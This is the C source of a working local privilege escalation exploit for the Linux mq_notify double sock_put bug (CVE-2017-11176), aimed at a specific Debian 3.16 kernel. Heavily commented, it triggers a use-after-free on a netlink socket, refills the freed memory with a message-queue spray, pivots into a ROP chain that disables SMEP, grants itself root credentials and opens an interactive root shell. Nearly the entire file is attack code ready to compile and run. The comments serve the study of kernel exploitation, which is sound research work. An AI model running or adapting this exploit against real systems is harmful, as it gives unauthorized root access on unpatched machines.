/**
 * CVE-2017-11176 mq_notify: double sock_put() exploit LPE
 * 
 * Target: Linux 3.16.0-4-amd64 #1 SMP Debian 3.16.36-1+deb8u1 (2016-09-03) x86_64 GNU/Linux
 *         with SMEP and without SMAP and KALSR
 * 
 * Twitter: @klecko0
 * Github: @klecko
 * 
 */

#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <asm/types.h>
#include <mqueue.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdbool.h>
#include <linux/wait.h>
#include <sys/mman.h>

#include "utils.h"

struct wait_queue fake_wq;
void* fake_stack[FAKE_STACK_SIZE];
void* saved_rsp, *saved_rbp;
int unblocking_fd;

void wrapper_ring_zero_entry(void);

void error(const char* msg){
	perror(msg);
	exit(EXIT_FAILURE);
}

/**
 * fill_sock_recv_buff: binds a socket and fills it recv buff
 *
 * Binds socket attached to recv_fd and sends it a msg so its recv buff
 * is filled. That way netlink_attachskb called from mq_notify will return 1,
 * allowing us to trigger the double sock_put(). Also, because the recv buff
 * is full, netlink_attachskb will block. We leverage and solve that with
 * the unblocking thread.
 * 
 * Warning: binding the sock increments its refcnt.
 * Warning: it sends a single msg which in my case was enough to fill
 *   the buffer, but it may be better to be sure and send more, until -EAGAIN.
 */
void fill_sock_recv_buff(int recv_fd){
	int send_fd;
	char buf[MSG_FILL_BUF_SIZE];

	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
		.nl_pad = 0,
		.nl_pid = 118, // must be different than zero
		.nl_groups = 0 // no groups
	};

	struct iovec iov = {
		.iov_base = buf,
		.iov_len = sizeof(buf)
	};

	struct msghdr msg = {
		.msg_name = &addr,
		.msg_namelen = sizeof(addr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = NULL,
		.msg_controllen = 0,
		.msg_flags = 0,
	};

	if ((send_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) == -1)
		error("[-] socket");

	if (_bind(recv_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1)
		error("[-] bind");

	if (_sendmsg(send_fd, &msg, MSG_DONTWAIT) == -1)
		error("[-] sendmsg");

	close(send_fd);
}

struct args_struct {
	int s_fd;
	int unblocking_fd;
};

/**
 * unblocking_thread: closes the fd and unblocks main thread
 * 
 * Waits a bit until main thread blocks when mq_notify calls
 * netlink_attachskb, then closes the fd passed to mq_notify and
 * finally unblocks the main thread so mq_notify execution continues.
 *
 * As netlink_attachskb blocks the main thread, we can close the fd
 * while it's blocked and exploit the race condition in a deterministic way.
 * 
 * It needs two fds refering to the same socket. The first of them is the one
 * passed to mq_notify, which will be closed, and the second one is the one
 * that will be used to call setsockopt and wake up the main thread.
 */
static void* unblocking_thread(void *arg){
	int val;
	struct args_struct* args = arg;
	sleep(UNBLOCKING_DELAY);

	// Closing s_fd is just to make the fdget at mqueue.c:1227 fail.
	// It's necessary having another fd to call setsockopt and thus unblock
	// the main thread.
	close(args->s_fd);        // mqueue.c:1228
	val = 1234;               // non-zero value, af_netlink.c:2237
	if (_setsockopt(args->unblocking_fd,
		  SOL_NETLINK,        // af_netlink.c:2189
		  NETLINK_NO_ENOBUFS, // af_netlink.c:2236
		  &val, sizeof(val)) == -1)
			error("[-] setsockopt");
	return NULL;
}

/**
 * decrease_sock_refcount: triggers the double sock_put() bug in mq_notify
 * 
 * Creates the unblocking thread that will close `fd` and unblock us when we
 * block in netlink_attachskb. Then calls mq_notify which will block and
 * trigger the bug.
 * 
 * Mq_notify calls netlink_attachskb, which blocks, calls sock_put (first time)
 * at af_netlink.c:1732, and then returns 1. Mq_notify forgets to null sock,
 * and goes to retry (mqueue.c:1243). As netlink_attachskb blocks in
 * af_netlink.c:1728, from unblocking_thread we are able to close the fd.
 * That way the fdget in mqueue.c:1227 fails, and the second sock_put is
 * called from netlink_detachskb at mqueue.c:1302.
 * 
 * The socket `fd` must have its recv buff full, so netlink_attachskb
 * blocks, calls sock_put and returns 1. `fd` will be closed to trigger
 * the bug, and `unblocking_fd` will be used to unblock the main thread.
 */
void decrease_sock_refcount(int fd, int unblocking_fd){
	char buf[NOTIFY_COOKIE_LEN];
	struct sigevent sigev;
	pthread_t t_id;
	struct args_struct args = {fd, unblocking_fd};

	memset(&sigev, 0, sizeof(sigev));
	sigev.sigev_notify = SIGEV_THREAD; // mqueue.c:1207
	sigev.sigev_value.sival_ptr = buf; // mqueue.c:1216
	sigev.sigev_signo = fd;            // mqueue.c:1234

	if (pthread_create(&t_id, NULL, unblocking_thread, &args) != 0)
		error("[-] pthread_create");

	if (_mq_notify(-1, &sigev) == -1)
		if (errno != EBADF)
			error("[-] mq_notify unexpected error");
}

/**
 * reallocation: performs the last decrease_sock_refcount and reallocs
 * 
 * Creates the payload that will replace the sock when freed.
 * Then calls decrease_sock_refcount, which frees the sock, and quickly
 * calls msgsnd, which will kmalloc our payload. Although the sock is freed,
 * socket->sk is a reference to the sock which is not NULL (UAF).
 * 
 * Reallocation has more success change if done with multiple threads, all
 * in the same CPU, but I wanted to keep it simple.
 * 
 * The size of the kmalloc will be MSG_KMALLOC_BUF_SIZE + SIZEOF_STRUCT_MSG_MSG
 * Its first SIZEOF_STRUCT_MSG_MSG bytes will be uncontrolled, and the rest
 * will be our payload. As our payload will be placed at that offset,
 * we must substract it from the base address to use sock offsets correctly.
 * 
 * [     |                  ]
 * ^     ^
 * |     our payload starts, offset SIZEOF_STRUCT_MSG_MSG
 * kmalloc address (sock address)
 * 
 * The payload will set the sock->wait to a wait queue whose first element's
 * func is the gadget `xchg eax, esp`. This element is fake_wq. When its func
 * is called, eax will point to itself, so we are stack pivoting to it.
 * The first field of fake_wq is flags, where we'll place the gadget
 * `add rsp, 0x40`. When executed, as sizeof(wait_queue) is 0x40, stack will
 * be placed after fake_wq, where our fake_stack is (see globals definitions).
 * We'll perform proper ROP there.
 * 
 * We can call fake_wq->func with setsockopt (see netlink_setsockopt at
 * af_netlink.c:2240, which ends up calling __wake_up_common, wait.c:64)
 * 
 * The payload also sets sock->portid and sock->groups so we can check if
 * the reallocation succeeded with getsockname (see check_reallocation)
 */

void reallocation(int s_fd, int unblocking_fd){
	int msqid;
	struct wait_queue_head* wq_head;
	struct msgbuf {
		long mtype;
		char mtext[MSG_KMALLOC_BUF_SIZE];
	} msg;

	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1)
		error("[-] msgget");

	msg.mtype = 1;
	memset(msg.mtext, PADDING_BYTE, sizeof(msg.mtext));
	*(int*)(msg.mtext - SIZEOF_STRUCT_MSG_MSG + NLK_PORTID_OFFSET) = NLK_PORTID_MAGIC_VALUE;
	*(void**)(msg.mtext - SIZEOF_STRUCT_MSG_MSG + NLK_GROUPS_OFFSET) = 0;

	// fake_wq next and prev should point to wq_head, but we don't know its address as it is in kernel memory
	// instead, we'll make it point a valid wq (itself) and make __wake_up_common break the list_for_each_entry_safe
	// in order to do that, instead of setting correct flags we'll set rbx to WQ_FLAG_EXCLUSIVE in fake_wq.func,
	// (actually in wrapper_ring_zero) as it is the register where __wake_up_common saves fake_wq.flags
	wq_head = (struct wait_queue_head*)(msg.mtext - SIZEOF_STRUCT_MSG_MSG + NLK_WAIT_OFFSET);
	wq_head->task_list.next = &fake_wq.task_list;
	wq_head->task_list.prev = &fake_wq.task_list;
	fake_wq.task_list.next = &fake_wq.task_list;
	fake_wq.task_list.prev = &fake_wq.task_list;
	fake_wq.func = XCHG_EAX_ESP;   // ARBITRARY CALL: will set stack to &fake_wq.flags
	fake_wq.flags = ADD_RSP_0x40;  // will set stack to fake_stack+8

	msg.mtext[MSG_KMALLOC_BUF_SIZE-1] = 0;

	// Free sock and realloc
	decrease_sock_refcount(s_fd, unblocking_fd);
	while (_msgsnd(msqid, &msg, MSG_KMALLOC_BUF_SIZE, IPC_NOWAIT) != -1);
	if (errno != EAGAIN)
		error("[-] msgsnd unexpected error");
}

/**
 * check_reallocation: checks if reallocation succeeded after sock was freed
 * 
 * Simply calls getsockname, which retrieves sock->portid, then saves its value
 * in magic_portid and checks if it is the magic value we placed. If not,
 * reallocation failed (see netlink_getname at af_netlink.c:1627).
 */
bool check_reallocation(int s_fd, unsigned int* magic_portid){
	struct sockaddr_nl addr;
	int len = sizeof(addr);
	if (getsockname(s_fd, (struct sockaddr *)&addr, &len) == -1)
		error("[-] getsockname");

	*magic_portid = addr.nl_pid;
	return addr.nl_pid == NLK_PORTID_MAGIC_VALUE;
}

/**
 * prepare_stack: prepares the fake_stack for ROP
 * 
 * Creates a ROP chain that saves rbp and rsp original values so we can restore
 * them later, disables SMEP and jumps to wrapper_ring_zero_entry.
 */
void prepare_stack(void){
	void** stack = fake_stack;
	*stack++ = NULL; // code jumps to fake_stack+8

	// rax has 32 LSB of previous rsp
	// rbp keeps previous rbp
	// with 32 MSB of rbp and 32 LSB of rsp we get previous rsp
	*stack++ = MOV_RDX_RAX_JA;
	*stack++ = MOV_RAX_RBP_POP_RBP;
	*stack++ = 0;

	STORE_EAX(&saved_rbp);
	*stack++ = SHR_RAX_32;
	// eax = msb_saved_rbp = msb_saved_rsp
	STORE_EAX(&saved_rbp+4);
	STORE_EAX(&saved_rsp+4);
	*stack++ = MOV_RAX_RDX;
	// eax = lsb_saved_rsp
	STORE_EAX(&saved_rsp);

	DISABLE_SMEP();

	*stack++ = POP_RDI;
	*stack++ = wrapper_ring_zero_entry;
	*stack++ = JMP_RDI;
}

/**
 * wrapper_ring_zero: wrapper for ring_zero execution
 * 
 * It is called from the ROP chain. Restores kernel previous rbp and rsp
 * and calls the real payload, which is ring_zero. After that, fulfills
 * conditions for breaking the loop of __wake_up_common.
 * As naked attribute didn't seem to work in my vm's gcc, had to put a tag
 * at the start so I could skip function prologue.
 */
void wrapper_ring_zero(void){
	asm volatile("wrapper_ring_zero_entry:" ::);
	__asm__ volatile("movq %0, %%rax\n"
                     "movq %%rax, %%rbp\n"
                     :: "m"(saved_rbp)  );
	__asm__ volatile("movq %0, %%rax\n"  
                     "movq %%rax, %%rsp\n"
                     :: "m"(saved_rsp)  );

	__asm__ volatile("call ring_zero\n");

	// conditions for breaking the loop of __wake_up_common
	// set flags to WQ_FLAG_EXCLUSIVE_STR
	asm volatile("movq $" WQ_FLAG_EXCLUSIVE_STR ", %%rbx" ::);
	// non-zero return
	asm volatile("movq $123, %%rax" ::);
	asm volatile("ret" ::);
}

/**
 * ring_zero: real payload, ring zero arbitrary execution.
 * 
 * Fixes dangling pointer socker->sk so kernel doesn't crash inmediately.
 * Then gets root. Many more things could be done from here, such as
 * escaping seccomp sandbox.
 * 
 * Note: there are more dangling pointers in netlink module which remain
 * unfixed, so most things related with that module will probably crash
 * the kernel, including running the exploit again (fixing everything was
 * too much work :P)
 */

void ring_zero(void){
	struct task_struct* current = get_current((__uint64_t)saved_rsp);
	struct socket* sock = current->files->fdt->fd[unblocking_fd]->private_data;
	sock->sk = NULL;

	commit_creds(prepare_kernel_cred(NULL));
}

/**
 * shell: spawns a shell
 */
void shell(void){
	char shell[] = "/bin/bash";
    char* args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}

int main(){
	// unblocking_fd is global, as it is needed in ring_zero to fix the kernel
	int s_fd, s_fd2, val;
	unsigned int magic_portid;

	printf("=={ CVE-2017-11176 mq_notify: double sock_put() exploit LPE | by Klecko }==\n");
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	if ((s_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) == -1)
		error("[-] socket");
	// Now sock refcnt = 1

	printf("[+] Filling socket recv buff\n");
	fill_sock_recv_buff(s_fd);
	// Now sock refcnt = 2

	// Another way: having decrease_sock_refcount to create unblocking_fd
	// and close it, and having s_fd3 here instead of unblocking_fd.
	if ((unblocking_fd = dup(s_fd)) == -1 || (s_fd2 = dup(s_fd)) == -1)
		error("[-] dup");

	printf("[+] First double sock_put()...\n");
	decrease_sock_refcount(s_fd, unblocking_fd);
	// Now sock refcnt = 1
	printf("[+] Second double sock_put(), free and reallocation...\n");
	reallocation(s_fd2, unblocking_fd);
	// Now sock refcnt = 0 (it has beeing freed and hopefully
	// our payload has taken up its place)

	// unblocking_fd is the only open fd right now, and it's our mechanism for UAF
	if (!check_reallocation(unblocking_fd, &magic_portid)){
		printf("[-] Reallocation failed, found value 0x%x instead of 0x%x\n", magic_portid, NLK_PORTID_MAGIC_VALUE);
		exit(EXIT_FAILURE);
	}

	prepare_stack();

	printf("[+] Press key for arbitrary call and ring zero execution\n");
	getchar();
	val = 1234;
	if (setsockopt(unblocking_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)) == -1)
		error("[-] Setsockopt arbitrary call failed");
	close(unblocking_fd); // not needed anymore

	printf("[+] Success! Popping shell...\n");
    shell();
}
